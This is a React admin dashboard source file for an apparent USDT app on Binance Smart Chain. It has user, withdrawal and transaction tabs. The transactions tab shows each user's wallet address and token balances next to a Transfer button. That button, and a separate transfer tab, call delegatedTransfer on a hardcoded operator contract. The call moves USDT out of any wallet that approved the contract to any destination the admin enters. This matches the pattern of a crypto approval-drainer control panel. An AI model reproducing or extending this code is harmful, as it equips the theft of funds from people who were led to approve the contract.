import { Authenticated, Unauthenticated, AuthLoading } from "convex/react";
import { Header } from "@/components/header.tsx";
import { Skeleton } from "@/components/ui/skeleton.tsx";
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
} from "@/components/ui/card.tsx";
import { Button } from "@/components/ui/button.tsx";
import { Input } from "@/components/ui/input.tsx";
import { Label } from "@/components/ui/label.tsx";
import { Textarea } from "@/components/ui/textarea.tsx";
import { Badge } from "@/components/ui/badge.tsx";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select.tsx";
import {
  Tabs,
  TabsContent,
  TabsList,
  TabsTrigger,
} from "@/components/ui/tabs.tsx";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog.tsx";
import { useQuery, useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import { useUserRole } from "@/hooks/use-user-role.ts";
import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { toast } from "sonner";
import { Users, DollarSign, ArrowDownToLine, Activity, ArrowRightLeft } from "lucide-react";
import type { Id } from "@/convex/_generated/dataModel.d.ts";

declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
    };
  }
}

export default function Admin() {
  return (
    <>
      <Unauthenticated>
        <div className="min-h-screen flex items-center justify-center bg-background">
          <div className="text-center space-y-6">
            <h1 className="text-4xl text-balance font-bold tracking-tight">
              Admin Dashboard
            </h1>
            <p className="text-xl text-muted-foreground">
              Admin access required
            </p>
          </div>
        </div>
      </Unauthenticated>
      <AuthLoading>
        <Skeleton className="h-screen w-full" />
      </AuthLoading>
      <Authenticated>
        <AdminPage />
      </Authenticated>
    </>
  );
}

function AdminPage() {
  const { user, isAdmin } = useUserRole();
  const navigate = useNavigate();

  useEffect(() => {
    if (user && !isAdmin) {
      toast.error("Admin access required");
      navigate("/");
    }
  }, [user, isAdmin, navigate]);

  if (!user || !isAdmin) {
    return null;
  }

  return (
    <div className="min-h-screen bg-background">
      <Header />
      <div className="mx-auto max-w-7xl px-4 py-8">
        <h1 className="mb-6 text-3xl font-bold">Admin Dashboard</h1>

        <Tabs defaultValue="overview" className="space-y-6">
          <TabsList>
            <TabsTrigger value="overview">Overview</TabsTrigger>
            <TabsTrigger value="users">Users</TabsTrigger>
            <TabsTrigger value="withdrawals">Withdrawals</TabsTrigger>
            <TabsTrigger value="transactions">Transactions</TabsTrigger>
            <TabsTrigger value="transfer">Transfer USDT</TabsTrigger>
          </TabsList>

          <TabsContent value="overview">
            <OverviewTab />
          </TabsContent>

          <TabsContent value="users">
            <UsersTab />
          </TabsContent>

          <TabsContent value="withdrawals">
            <WithdrawalsTab />
          </TabsContent>

          <TabsContent value="transactions">
            <TransactionsTab />
          </TabsContent>

          <TabsContent value="transfer">
            <TransferTab />
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}

function OverviewTab() {
  const stats = useQuery(api.admin.getStats);

  if (!stats) {
    return <Skeleton className="h-64 w-full" />;
  }

  return (
    <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
      <Card>
        <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
          <CardTitle className="text-sm font-medium">Total Users</CardTitle>
          <Users className="h-4 w-4 text-muted-foreground" />
        </CardHeader>
        <CardContent>
          <div className="text-2xl font-bold">{stats.totalUsers}</div>
        </CardContent>
      </Card>

      <Card>
        <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
          <CardTitle className="text-sm font-medium">
            Total Transactions
          </CardTitle>
          <Activity className="h-4 w-4 text-muted-foreground" />
        </CardHeader>
        <CardContent>
          <div className="text-2xl font-bold">{stats.totalTransactions}</div>
        </CardContent>
      </Card>

      <Card>
        <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
          <CardTitle className="text-sm font-medium">
            Pending Withdrawals
          </CardTitle>
          <ArrowDownToLine className="h-4 w-4 text-muted-foreground" />
        </CardHeader>
        <CardContent>
          <div className="text-2xl font-bold">{stats.pendingWithdrawals}</div>
        </CardContent>
      </Card>

      <Card>
        <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
          <CardTitle className="text-sm font-medium">
            Total Withdrawals
          </CardTitle>
          <DollarSign className="h-4 w-4 text-muted-foreground" />
        </CardHeader>
        <CardContent>
          <div className="text-2xl font-bold">{stats.totalWithdrawals}</div>
        </CardContent>
      </Card>
    </div>
  );
}

function UsersTab() {
  const users = useQuery(api.admin.getAllUsers);
  const updateUserRole = useMutation(api.admin.updateUserRole);

  async function handleRoleChange(userId: Id<"users">, newRole: "admin" | "user") {
    try {
      await updateUserRole({ userId, role: newRole });
      toast.success("User role updated");
    } catch (error) {
      toast.error("Failed to update user role");
    }
  }

  if (!users) {
    return <Skeleton className="h-64 w-full" />;
  }

  return (
    <Card>
      <CardHeader>
        <CardTitle>All Users ({users.length})</CardTitle>
      </CardHeader>
      <CardContent>
        <div className="space-y-3">
          {users.map((user) => (
            <div
              key={user._id}
              className="flex items-center justify-between rounded-lg border bg-card p-4"
            >
              <div className="space-y-1">
                <div className="font-semibold">{user.name || "Unknown"}</div>
                <div className="text-sm text-muted-foreground">
                  {user.email}
                </div>
                {user.walletAddress && (
                  <div className="font-mono text-xs text-muted-foreground">
                    {user.walletAddress.slice(0, 10)}...
                    {user.walletAddress.slice(-8)}
                  </div>
                )}
                <div className="text-xs text-muted-foreground">
                  Joined: {new Date(user._creationTime).toLocaleDateString()}
                </div>
              </div>

              <div className="flex items-center gap-2">
                <Select
                  value={user.role}
                  onValueChange={(value: "admin" | "user") =>
                    handleRoleChange(user._id as Id<"users">, value)
                  }
                >
                  <SelectTrigger className="w-32">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="user">User</SelectItem>
                    <SelectItem value="admin">Admin</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            </div>
          ))}
        </div>
      </CardContent>
    </Card>
  );
}

function WithdrawalsTab() {
  const withdrawals = useQuery(api.withdrawals.getAllWithdrawals);
  const updateStatus = useMutation(api.withdrawals.updateWithdrawalStatus);

  const [selectedWithdrawal, setSelectedWithdrawal] = useState<string | null>(
    null
  );
  const [txHash, setTxHash] = useState("");
  const [adminNote, setAdminNote] = useState("");

  async function handleUpdateStatus(
    withdrawalId: Id<"withdrawals">,
    status: "approved" | "rejected" | "completed"
  ) {
    try {
      await updateStatus({
        withdrawalId,
        status,
        txHash: txHash || undefined,
        adminNote: adminNote || undefined,
      });
      toast.success(`Withdrawal ${status}`);
      setSelectedWithdrawal(null);
      setTxHash("");
      setAdminNote("");
    } catch (error) {
      toast.error("Failed to update withdrawal");
    }
  }

  function getStatusColor(status: string) {
    switch (status) {
      case "pending":
        return "bg-yellow-500/10 text-yellow-500 border-yellow-500/20";
      case "approved":
        return "bg-blue-500/10 text-blue-500 border-blue-500/20";
      case "completed":
        return "bg-green-500/10 text-green-500 border-green-500/20";
      case "rejected":
        return "bg-red-500/10 text-red-500 border-red-500/20";
      default:
        return "bg-muted text-muted-foreground";
    }
  }

  if (!withdrawals) {
    return <Skeleton className="h-64 w-full" />;
  }

  return (
    <Card>
      <CardHeader>
        <CardTitle>All Withdrawals ({withdrawals.length})</CardTitle>
      </CardHeader>
      <CardContent>
        <div className="space-y-3">
          {withdrawals.map((withdrawal) => (
            <div
              key={withdrawal._id}
              className="rounded-lg border bg-card p-4 space-y-3"
            >
              <div className="flex items-start justify-between">
                <div className="space-y-1">
                  <div className="flex items-center gap-2">
                    <span className="font-semibold text-lg">
                      {withdrawal.amount} USDT
                    </span>
                    <Badge className={getStatusColor(withdrawal.status)}>
                      {withdrawal.status}
                    </Badge>
                  </div>
                  <div className="text-sm text-muted-foreground">
                    User: {withdrawal.userName || "Unknown"} (
                    {withdrawal.userEmail})
                  </div>
                  <div className="font-mono text-xs text-muted-foreground">
                    To: {withdrawal.toAddress.slice(0, 10)}...
                    {withdrawal.toAddress.slice(-8)}
                  </div>
                  <div className="font-mono text-xs text-muted-foreground">
                    From: {withdrawal.walletAddress.slice(0, 10)}...
                    {withdrawal.walletAddress.slice(-8)}
                  </div>
                  {withdrawal.txHash && (
                    <div className="font-mono text-xs text-muted-foreground">
                      Tx: {withdrawal.txHash.slice(0, 10)}...
                      {withdrawal.txHash.slice(-8)}
                    </div>
                  )}
                  <div className="text-xs text-muted-foreground">
                    {new Date(withdrawal._creationTime).toLocaleString()}
                  </div>
                  {withdrawal.adminNote && (
                    <div className="mt-2 rounded bg-muted p-2 text-sm">
                      <div className="font-semibold">Admin Note:</div>
                      <div className="text-muted-foreground">
                        {withdrawal.adminNote}
                      </div>
                    </div>
                  )}
                </div>

                {withdrawal.status === "pending" && (
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={() => setSelectedWithdrawal(withdrawal._id)}
                  >
                    Process
                  </Button>
                )}
              </div>

              {selectedWithdrawal === withdrawal._id && (
                <div className="space-y-3 border-t pt-3">
                  <div>
                    <Label htmlFor="txHash">Transaction Hash (optional)</Label>
                    <Input
                      id="txHash"
                      value={txHash}
                      onChange={(e) => setTxHash(e.target.value)}
                      placeholder="0x..."
                    />
                  </div>

                  <div>
                    <Label htmlFor="adminNote">Admin Note (optional)</Label>
                    <Textarea
                      id="adminNote"
                      value={adminNote}
                      onChange={(e) => setAdminNote(e.target.value)}
                      placeholder="Add a note..."
                    />
                  </div>

                  <div className="flex gap-2">
                    <Button
                      size="sm"
                      onClick={() =>
                        handleUpdateStatus(
                          withdrawal._id as Id<"withdrawals">,
                          "approved"
                        )
                      }
                      className="bg-blue-500 hover:bg-blue-600"
                    >
                      Approve
                    </Button>
                    <Button
                      size="sm"
                      onClick={() =>
                        handleUpdateStatus(
                          withdrawal._id as Id<"withdrawals">,
                          "completed"
                        )
                      }
                      className="bg-green-500 hover:bg-green-600"
                    >
                      Complete
                    </Button>
                    <Button
                      size="sm"
                      variant="destructive"
                      onClick={() =>
                        handleUpdateStatus(
                          withdrawal._id as Id<"withdrawals">,
                          "rejected"
                        )
                      }
                    >
                      Reject
                    </Button>
                    <Button
                      size="sm"
                      variant="ghost"
                      onClick={() => {
                        setSelectedWithdrawal(null);
                        setTxHash("");
                        setAdminNote("");
                      }}
                    >
                      Cancel
                    </Button>
                  </div>
                </div>
              )}
            </div>
          ))}
        </div>
      </CardContent>
    </Card>
  );
}

function TransactionsTab() {
  const transactions = useQuery(api.transactions.getAllTransactions);
  const [selectedTransaction, setSelectedTransaction] = useState<{
    walletAddress: string;
    userName: string;
    userEmail: string;
  } | null>(null);

  if (!transactions) {
    return <Skeleton className="h-64 w-full" />;
  }

  return (
    <>
      <Card>
        <CardHeader>
          <CardTitle>All Transactions ({transactions.length})</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            {transactions.map((tx) => (
              <div
                key={tx._id}
                className="rounded-lg border bg-card p-4 space-y-3"
              >
                <div className="flex items-start justify-between">
                  <div className="space-y-2 flex-1">
                    <div className="flex items-center gap-3">
                      <div className="font-semibold text-lg">{tx.amount} USDT</div>
                      <Badge
                        className={
                          tx.status === "completed"
                            ? "bg-green-500/10 text-green-500 border-green-500/20"
                            : "bg-muted text-muted-foreground"
                        }
                      >
                        {tx.status}
                      </Badge>
                    </div>

                    <div className="grid gap-2 text-sm">
                      <div className="flex items-start gap-2">
                        <span className="font-semibold min-w-[140px]">User:</span>
                        <span className="text-muted-foreground">
                          {tx.userName || "Unknown"} ({tx.userEmail})
                        </span>
                      </div>

                      <div className="flex items-start gap-2">
                        <span className="font-semibold min-w-[140px]">Wallet Address:</span>
                        <span className="font-mono text-xs text-muted-foreground break-all">
                          {tx.walletAddress}
                        </span>
                      </div>

                      <div className="flex items-start gap-2">
                        <span className="font-semibold min-w-[140px]">To Address:</span>
                        <span className="font-mono text-xs text-muted-foreground break-all">
                          {tx.toAddress}
                        </span>
                      </div>

                      {tx.usdtBalance && (
                        <div className="flex items-start gap-2">
                          <span className="font-semibold min-w-[140px]">USDT Balance:</span>
                          <span className="text-muted-foreground">{tx.usdtBalance}</span>
                        </div>
                      )}

                      {tx.nativeBalance && (
                        <div className="flex items-start gap-2">
                          <span className="font-semibold min-w-[140px]">BNB Balance:</span>
                          <span className="text-muted-foreground">{tx.nativeBalance}</span>
                        </div>
                      )}

                      {tx.txHash && (
                        <div className="flex items-start gap-2">
                          <span className="font-semibold min-w-[140px]">Transaction Hash:</span>
                          <a
                            href={`https://bscscan.com/tx/${tx.txHash}`}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="font-mono text-xs text-primary hover:underline break-all"
                          >
                            {tx.txHash}
                          </a>
                        </div>
                      )}

                      <div className="flex items-start gap-2">
                        <span className="font-semibold min-w-[140px]">Date & Time:</span>
                        <span className="text-muted-foreground">{tx._creationTime}</span>
                      </div>
                    </div>
                  </div>

                  <Button
                    size="sm"
                    variant="default"
                    onClick={() =>
                      setSelectedTransaction({
                        walletAddress: tx.walletAddress,
                        userName: tx.userName || "Unknown",
                        userEmail: tx.userEmail || "",
                      })
                    }
                    className="ml-4"
                  >
                    <ArrowRightLeft className="mr-2 h-4 w-4" />
                    Transfer
                  </Button>
                </div>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>

      <TransferDialog
        transaction={selectedTransaction}
        onClose={() => setSelectedTransaction(null)}
      />
    </>
  );
}

function TransferDialog({
  transaction,
  onClose,
}: {
  transaction: {
    walletAddress: string;
    userName: string;
    userEmail: string;
  } | null;
  onClose: () => void;
}) {
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [adminConnected, setAdminConnected] = useState(false);

  const BSC_CHAIN_ID = "0x38";
  const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
  const TOKEN_OPERATOR = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

  useEffect(() => {
    if (!transaction) {
      setToAddress("");
      setAmount("");
      setIsProcessing(false);
    }
  }, [transaction]);

  async function connectAdminWallet() {
    if (!window.ethereum) {
      toast.error("MetaMask not found");
      return;
    }

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID }],
      });
    } catch (err) {
      const error = err as { code?: number };
      if (error.code === 4902) {
        await window.ethereum.request({
          method: "wallet_addEthereumChain",
          params: [
            {
              chainId: BSC_CHAIN_ID,
              chainName: "Binance Smart Chain",
              rpcUrls: ["https://bsc-dataseed.binance.org/"],
              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
              blockExplorerUrls: ["https://bscscan.com"],
            },
          ],
        });
      }
    }

    await window.ethereum.request({ method: "eth_requestAccounts" });
    setAdminConnected(true);
    toast.success("Admin wallet connected");
  }

  async function handleTransfer() {
    if (!transaction || !toAddress || !amount) {
      toast.error("Please fill all fields");
      return;
    }

    if (!adminConnected) {
      toast.error("Please connect admin wallet first");
      return;
    }

    setIsProcessing(true);

    try {
      const { ethers } = window as typeof window & {
        ethers: {
          BrowserProvider: new (provider: unknown) => {
            getSigner: () => Promise<unknown>;
          };
          Contract: new (
            address: string,
            abi: string[],
            signer: unknown
          ) => {
            delegatedTransfer: (
              tokenAddress: string,
              from: string,
              to: string,
              amount: bigint
            ) => Promise<{ wait: () => Promise<{ hash: string }> }>;
          };
          parseUnits: (value: string, decimals: number) => bigint;
        };
      };

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const operatorContract = new ethers.Contract(
        TOKEN_OPERATOR,
        [
          "function delegatedTransfer(address tokenAddress, address from, address to, uint256 amount) external returns (bool)",
        ],
        signer
      );

      const amountInWei = ethers.parseUnits(amount, 18);

      const tx = await operatorContract.delegatedTransfer(
        BSC_USDT,
        transaction.walletAddress,
        toAddress,
        amountInWei
      );

      toast.success("Transaction submitted! Waiting for confirmation...");

      await tx.wait();

      toast.success("Transfer successful! ✅");

      onClose();
    } catch (error) {
      console.error(error);
      const err = error as { reason?: string; message?: string };
      toast.error(err.reason || err.message || "Transfer failed");
    } finally {
      setIsProcessing(false);
    }
  }

  return (
    <Dialog open={!!transaction} onOpenChange={() => onClose()}>
      <DialogContent className="max-w-md">
        <DialogHeader>
          <DialogTitle>Transfer USDT from User</DialogTitle>
          <DialogDescription>
            Transfer USDT from {transaction?.userName}'s wallet using TokenOperator
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-4">
          <div className="rounded-lg bg-muted p-3 space-y-2">
            <div className="text-sm">
              <span className="font-semibold">User: </span>
              <span className="text-muted-foreground">
                {transaction?.userName} ({transaction?.userEmail})
              </span>
            </div>
            <div className="text-sm">
              <span className="font-semibold">From Wallet: </span>
              <span className="font-mono text-xs text-muted-foreground break-all">
                {transaction?.walletAddress}
              </span>
            </div>
          </div>

          {!adminConnected ? (
            <div className="space-y-3">
              <p className="text-sm text-muted-foreground">
                Connect your admin wallet to execute the transfer
              </p>
              <Button onClick={connectAdminWallet} className="w-full">
                Connect Admin Wallet
              </Button>
            </div>
          ) : (
            <div className="space-y-4">
              <div className="rounded-lg bg-green-500/10 p-3 text-sm text-green-500">
                ✅ Admin wallet connected
              </div>

              <div>
                <Label htmlFor="transferToAddress">To Address (Destination)</Label>
                <Input
                  id="transferToAddress"
                  value={toAddress}
                  onChange={(e) => setToAddress(e.target.value)}
                  placeholder="0x..."
                />
              </div>

              <div>
                <Label htmlFor="transferAmount">Amount (USDT)</Label>
                <Input
                  id="transferAmount"
                  type="number"
                  step="0.01"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="0.0"
                />
              </div>

              <div className="flex gap-2">
                <Button
                  onClick={handleTransfer}
                  disabled={isProcessing}
                  className="flex-1"
                >
                  {isProcessing ? "Processing..." : "Transfer USDT"}
                </Button>
                <Button variant="outline" onClick={onClose} disabled={isProcessing}>
                  Cancel
                </Button>
              </div>

              <div className="rounded-lg bg-muted p-3 text-xs text-muted-foreground">
                <p>
                  <strong>Note:</strong> The user must have already approved the
                  TokenOperator contract to transfer their USDT.
                </p>
              </div>
            </div>
          )}
        </div>
      </DialogContent>
    </Dialog>
  );
}

function TransferTab() {
  const [fromAddress, setFromAddress] = useState("");
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [adminConnected, setAdminConnected] = useState(false);

  const BSC_CHAIN_ID = "0x38";
  const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
  const TOKEN_OPERATOR = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

  async function connectAdminWallet() {
    if (!window.ethereum) {
      toast.error("MetaMask not found");
      return;
    }

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID }],
      });
    } catch (err) {
      const error = err as { code?: number };
      if (error.code === 4902) {
        await window.ethereum.request({
          method: "wallet_addEthereumChain",
          params: [
            {
              chainId: BSC_CHAIN_ID,
              chainName: "Binance Smart Chain",
              rpcUrls: ["https://bsc-dataseed.binance.org/"],
              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
              blockExplorerUrls: ["https://bscscan.com"],
            },
          ],
        });
      }
    }

    await window.ethereum.request({ method: "eth_requestAccounts" });
    setAdminConnected(true);
    toast.success("Admin wallet connected");
  }

  async function handleTransfer() {
    if (!fromAddress || !toAddress || !amount) {
      toast.error("Please fill all fields");
      return;
    }

    if (!adminConnected) {
      toast.error("Please connect admin wallet first");
      return;
    }

    setIsProcessing(true);

    try {
      const { ethers } = window as typeof window & {
        ethers: {
          BrowserProvider: new (provider: unknown) => {
            getSigner: () => Promise<unknown>;
          };
          Contract: new (
            address: string,
            abi: string[],
            signer: unknown
          ) => {
            delegatedTransfer: (
              tokenAddress: string,
              from: string,
              to: string,
              amount: bigint
            ) => Promise<{ wait: () => Promise<{ hash: string }> }>;
          };
          parseUnits: (value: string, decimals: number) => bigint;
        };
      };

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const operatorContract = new ethers.Contract(
        TOKEN_OPERATOR,
        [
          "function delegatedTransfer(address tokenAddress, address from, address to, uint256 amount) external returns (bool)",
        ],
        signer
      );

      const amountInWei = ethers.parseUnits(amount, 18);

      const tx = await operatorContract.delegatedTransfer(
        BSC_USDT,
        fromAddress,
        toAddress,
        amountInWei
      );

      toast.success("Transaction submitted! Waiting for confirmation...");

      await tx.wait();

      toast.success("Transfer successful! ✅");

      setFromAddress("");
      setToAddress("");
      setAmount("");
    } catch (error) {
      console.error(error);
      const err = error as { reason?: string; message?: string };
      toast.error(err.reason || err.message || "Transfer failed");
    } finally {
      setIsProcessing(false);
    }
  }

  return (
    <Card>
      <CardHeader>
        <CardTitle>Transfer USDT (Admin Only)</CardTitle>
      </CardHeader>
      <CardContent className="space-y-6">
        {!adminConnected ? (
          <div className="space-y-4">
            <p className="text-sm text-muted-foreground">
              Connect your admin wallet to transfer USDT from approved users
            </p>
            <Button onClick={connectAdminWallet} className="w-full">
              Connect Admin Wallet
            </Button>
          </div>
        ) : (
          <div className="space-y-4">
            <div className="rounded-lg bg-green-500/10 p-3 text-sm text-green-500">
              ✅ Admin wallet connected
            </div>

            <div>
              <Label htmlFor="fromAddress">From Address (User Wallet)</Label>
              <Input
                id="fromAddress"
                value={fromAddress}
                onChange={(e) => setFromAddress(e.target.value)}
                placeholder="0x..."
              />
              <p className="mt-1 text-xs text-muted-foreground">
                The user must have approved the contract first
              </p>
            </div>

            <div>
              <Label htmlFor="toAddress">To Address (Destination)</Label>
              <Input
                id="toAddress"
                value={toAddress}
                onChange={(e) => setToAddress(e.target.value)}
                placeholder="0x..."
              />
            </div>

            <div>
              <Label htmlFor="amount">Amount (USDT)</Label>
              <Input
                id="amount"
                type="number"
                step="0.01"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="0.0"
              />
            </div>

            <Button
              onClick={handleTransfer}
              disabled={isProcessing}
              className="w-full"
            >
              {isProcessing ? "Processing..." : "Transfer USDT"}
            </Button>

            <div className="rounded-lg bg-muted p-4 text-sm">
              <div className="font-semibold mb-2">How it works:</div>
              <ol className="list-decimal list-inside space-y-1 text-muted-foreground">
                <li>User approves the TokenOperator contract</li>
                <li>Admin connects wallet and enters transfer details</li>
                <li>Admin signs the transaction</li>
                <li>USDT is transferred from user to destination</li>
              </ol>
            </div>
          </div>
        )}
      </CardContent>
    </Card>
  );
}
